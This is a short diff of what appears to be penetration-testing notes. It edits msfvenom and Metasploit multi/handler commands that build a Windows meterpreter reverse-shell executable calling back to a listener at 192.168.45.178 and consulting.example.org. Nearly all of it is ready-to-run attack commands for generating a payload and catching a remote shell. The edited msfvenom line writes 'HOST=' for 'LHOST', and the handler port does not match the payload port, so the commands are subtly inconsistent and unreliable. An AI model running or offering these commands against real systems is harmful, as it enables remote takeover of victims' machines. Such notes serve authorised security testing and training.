@@ -2,12 +2,12 @@
 
 met payload:
 ```
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
+$ msfvenom -p windows/meterpreter/reverse_http HOST=192.168.45.178 LPORT=4343 -f exe -o met.exe
 
 # Exploit after met.exe execution
 $ msfconsole
 msf> use exploit/multi/handler
-msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_https
+msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_http
 msf exploit(handler) > set LHOST consulting.example.org
 msf exploit(handler) > set LPORT 4443
 msf exploit(handler) > set SessionCommunicationTimeout 0
